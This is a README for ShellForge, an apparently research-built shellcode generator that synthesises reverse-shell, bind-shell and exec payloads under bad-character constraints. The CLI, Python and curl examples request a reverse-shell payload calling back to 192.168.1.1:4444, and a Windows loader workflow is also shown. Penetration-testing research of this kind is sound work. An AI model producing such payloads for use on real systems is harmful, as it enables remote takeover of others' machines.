# ShellForge

> Constraint-aware shellcode generator — synthesises position-independent payloads under bad-char, size, and encoding constraints across four architectures.

![License](https://img.shields.io/badge/license-MIT-blue)
![Language](https://img.shields.io/badge/language-C99%20%7C%20Python-orange)
![Architectures](https://img.shields.io/badge/arch-x86--64%20%7C%20x86--32%20%7C%20ARM%20%7C%20MIPS-green)
![Tests](https://img.shields.io/badge/tests-99%2F99-brightgreen)
[![Medium](https://img.shields.io/badge/Medium-InfoSec_Write--ups-black?logo=medium)](https://infosecwriteups.com/shellforge-building-a-constraint-aware-shellcode-generator-from-scratch-f57eaea15c78)

---

## What is ShellForge?

Most shellcode tools work by maintaining a library of pre-written templates and applying encoding wrappers after the fact. ShellForge treats constraints as **inputs to the synthesis process** — the engine selects and assembles instructions that satisfy all constraints from the start, rather than generating then trying to fix.

The result is a tool that produces smaller, cleaner payloads faster — and can satisfy constraint profiles that template-based tools fail on entirely.

---

## Benchmark

Tested across 10 constraint profiles against pwntools 4.15:

| Metric | ShellForge | pwntools |
|---|---|---|
| Success rate | 8/10 | 8/10 |
| Clean output rate | **8/10** | 7/10 |
| Avg payload size | **40B** | 56B |
| Avg synthesis time | **0.1ms** | 1300ms |

**Key finding:** Under bad chars `\x00\x0a\x0d\x20\x2f`, pwntools produces a payload containing forbidden bytes. ShellForge produces a verified-clean 49-byte XOR-encoded payload.

---

## Features

- **4 target architectures** — x86-64, x86-32, ARM Thumb, MIPS BE
- **2 operating systems** — Linux (all archs), Windows x86-64
- **4 payload goals** — execve shell, reverse shell, bind shell, arbitrary write
- **2 encoding schemes** — XOR and ADD/SUB with self-contained REX-free decoder stubs
- **Constraint solver** — bad chars, null-free, newline-free, size budget
- **Flask REST API** — `/synthesize`, `/annotate`, `/arches`, `/health`
- **GPT-4o-mini annotation** — plain-English shellcode explanation
- **HTML dashboard** — no Node.js, no build step
- **Windows PEB walker** — ROR13 hash-based API resolution, execution-verified on Win10 x64

---

## Architecture

```
HTML Dashboard (dashboard.html)
        │  HTTP
Flask REST API (python/api/app.py)
        │  ctypes
Python Bridge (python/engine/shellforge_bridge.py)
        │  direct call
C Core (core/build/libshellforge.so)
  ├── shellforge.c        constraint model, dispatcher, x86-64, encoders
  ├── arch_profiles.c     syscall tables per arch
  ├── arch_x86_32.c       x86-32 Linux synthesiser
  ├── arch_arm.c          ARM Thumb Linux synthesiser
  ├── arch_mips.c         MIPS BE Linux synthesiser
  └── arch_win64.c        Windows x86-64 PEB walk synthesiser
```

---

## Quick Start

### 1. Build the C core

```bash
git clone https://github.com/userIssa/genhears
cd shellforge/core
bash build.sh
```

Requires: `gcc`. No cmake needed.

### 2. Install Python dependencies

```bash
pip install flask flask-cors openai
```

### 3. Start the API

```bash
cd shellforge
OPENAI_API_KEY=your_key python python/api/app.py
```

### 4. Open the dashboard

Open `frontend/dashboard.html` in your browser. The green dot confirms API connection.

---

## CLI Usage

```bash
./core/build/sf_cli
./core/build/sf_cli --null-free
./core/build/sf_cli --bad-chars 00,0a,0d
./core/build/sf_cli --arch arm --size 64
```

---

## Python API

```python
from python.engine.shellforge_bridge import ShellForge, Constraints, Arch, OS, Goal

sf = ShellForge()
c  = Constraints(
    arch=Arch.X86_64, os=OS.LINUX,
    goal=Goal.REVERSE_SHELL, null_free=True,
    goal_args=["192.168.1.1:4444"],
)
r = sf.synthesize(c)
print(r.hex_escaped())
print(f"{r.payload_len} bytes, encoding={r.encoding_used.name}")
```

---

## REST API

```bash
# Synthesise
curl -X POST http://127.0.0.1:5000/synthesize \
  -H "Content-Type: application/json" \
  -d '{"arch":"x86_64","goal":"reverse_shell","goal_args":["192.168.1.1:4444"],"null_free":true}'

# Annotate
curl -X POST http://127.0.0.1:5000/annotate \
  -H "Content-Type: application/json" \
  -d '{"disasm":"xor rsi,rsi\n...","arch":"x86_64","goal":"exec_shell","encoding_used":"NONE"}'
```

---

## Supported Targets

| Arch | OS | exec | revshell | bindshell | arb_write |
|---|---|---|---|---|---|
| x86-64 | Linux | ✅ | ✅ | ✅ | ✅ |
| x86-64 | Windows | ✅ | 🔜 | 🔜 | ✅ |
| x86-32 | Linux | ✅ | ✅ | ✅ | ✅ |
| ARM Thumb | Linux | ✅ | ✅ | ✅ | ✅ |
| MIPS BE | Linux | ✅ | ✅ | ✅ | ✅ |

---

## Benchmarking

```bash
python tools/benchmark.py --no-msf
python tools/benchmark.py --json results.json
```

---

## Windows Testing

```bash
# On Kali
sudo apt install mingw-w64
python tools/gen_windows_payload.py --compile
# Transfer shellforge_loader.exe + payload.bin to Win VM
```

```cmd
shellforge_loader.exe --file payload.bin
```

---

## Running Tests

```bash
cd core && bash build.sh && cd ..
python tests/python/test_phase1.py   # 13 tests
python tests/python/test_phase2.py   # 19 tests
python tests/python/test_phase3.py   # 19 tests
python tests/python/test_phase4.py   # 18 tests
python tests/python/test_phase5.py   # 13 tests
```

---

## Project Structure

```
shellforge/
├── core/
│   ├── include/shellforge.h
│   ├── src/
│   └── build.sh
├── python/
│   ├── engine/shellforge_bridge.py
│   └── api/app.py
├── frontend/dashboard.html
├── tests/python/
├── tools/
│   ├── benchmark.py
│   ├── gen_windows_payload.py
│   └── shellforge_loader.c
└── docs/medium_article.md
```

---

## Disclaimer

For **security research, CTF practice, and authorised penetration testing only**. Only use against systems you own or have explicit written permission to test.

---

## Author

**Toluwanimi Oderinde** — Cybersecurity Engineer, CEH
[linkedin.com/in/toluwanimi-oderinde](https://linkedin.com/in/toluwanimi-oderinde)

*Built as an MSc-level penetration testing research project.*

**Read the full write-up:** [ShellForge: Building a Constraint-Aware Shellcode Generator from Scratch](https://infosecwriteups.com/shellforge-building-a-constraint-aware-shellcode-generator-from-scratch-f57eaea15c78) — InfoSec Write-ups
